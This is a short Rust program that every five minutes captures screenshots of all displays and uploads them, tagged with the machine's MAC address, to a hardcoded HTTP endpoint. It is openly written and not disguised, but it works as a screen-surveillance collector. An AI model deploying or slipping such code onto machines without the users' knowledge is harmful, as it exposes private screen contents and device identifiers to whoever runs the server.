use mac_address::get_mac_address;
use reqwest::{blocking::multipart, blocking::Client};
use screenshots::Screen;
use std::{
    io::Read,
    thread,
    time::{Duration, SystemTime, UNIX_EPOCH},
};

const API_ENDPOINT: &str = "http://0.0.0.0:3000/upload";
const DURATION: u64 = 300;

fn main() {
    loop {
        if let Err(err) = upload_screenshots() {
            eprintln!("Error: {}", err);
        }
        thread::sleep(Duration::from_secs(DURATION));
    }
}

fn upload_screenshots() -> Result<(), Box<dyn std::error::Error>> {
    let screens = Screen::all()?;
    let client = Client::new();
    let form = create_multipart_form(&screens)?;

    let mut request = client
        .post(API_ENDPOINT)
        .multipart(form.try_into()?)
        .send()?;

    let status = request.status();
    println!("Screenshots uploaded with status: {}", status);

    let mut body = Vec::new();
    request.read_to_end(&mut body)?;
    println!("Response Body: {:?}", body);

    Ok(())
}

fn create_multipart_form(
    screens: &[Screen],
) -> Result<multipart::Form, Box<dyn std::error::Error>> {
    let mut form = multipart::Form::new();
    form = add_mac_address_field(form)?;
    for screen in screens {
        let image_data = capture_screenshot(screen)?;
        let file_name = generate_file_name(screen)?;
        let part = create_multipart_part(image_data, file_name)?;
        form = add_multipart_part(form, part);
    }
    Ok(form)
}

fn add_mac_address_field(
    form: multipart::Form,
) -> Result<multipart::Form, Box<dyn std::error::Error>> {
    let mac_address = get_mac_address()?.ok_or("mac address error")?.to_string();
    Ok(form.text("mac_address", mac_address))
}

fn capture_screenshot(screen: &Screen) -> Result<Vec<u8>, Box<dyn std::error::Error>> {
    let image = screen.capture()?;
    image.to_png().map_err(|e| e.into())
}

fn generate_file_name(screen: &Screen) -> Result<String, Box<dyn std::error::Error>> {
    let duration = SystemTime::now().duration_since(UNIX_EPOCH)?;
    let file_name = format!(
        "screenshot-{}-{}.png",
        screen.display_info.id,
        duration.as_secs()
    );
    Ok(file_name)
}

fn create_multipart_part(
    image_data: Vec<u8>,
    file_name: String,
) -> Result<multipart::Part, Box<dyn std::error::Error>> {
    let part = multipart::Part::bytes(image_data)
        .file_name(file_name)
        .mime_str("image/png")?;
    Ok(part)
}

fn add_multipart_part(form: multipart::Form, part: multipart::Part) -> multipart::Form {
    form.part("images", part)
}
